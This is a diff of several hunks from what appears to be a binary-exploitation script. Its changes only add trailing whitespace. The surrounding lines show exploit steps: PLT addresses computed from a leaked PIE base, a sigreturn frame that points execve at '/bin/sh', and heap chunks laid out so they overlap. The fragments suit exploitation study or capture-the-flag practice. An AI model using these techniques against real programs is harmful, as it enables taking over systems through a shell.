@@ -465,7 +465,7 @@ let base = leak_pie_base()
 
 // Locate PLT entries (no randomization in PIE-disabled binaries)
 let plt_puts = base + 0x1040       // puts@PLT
-let plt_gets = base + 0x1050       // gets@PLT
+let plt_gets = base + 0x1050       // gets@PLT  
 let plt_system = base + 0x1060     // system@PLT (if available)
 let plt_printf = base + 0x1070     // printf@PLT
 
@@ -587,7 +587,7 @@ let sigframe = [
     0x0,                    // r15
     bin_sh_addr,            // rdi (arg1 for execve)
     0x0,                    // rsi (arg2)
-    0x0,                    // rdx (arg3)
+    0x0,                    // rdx (arg3)  
     0x0,                    // rcx
     0x0,                    // rbx
     0x0,                    // rbp
@@ -673,7 +673,7 @@ end
 // Step 1: Setup heap layout
 // Allocate chunks in specific order for overlap
 malloc 0x100  // chunk A
-malloc 0x100  // chunk B
+malloc 0x100  // chunk B  
 malloc 0x100  // chunk C (prevent consolidation)
 
 // Step 2: Free chunk A to create a fake chunk
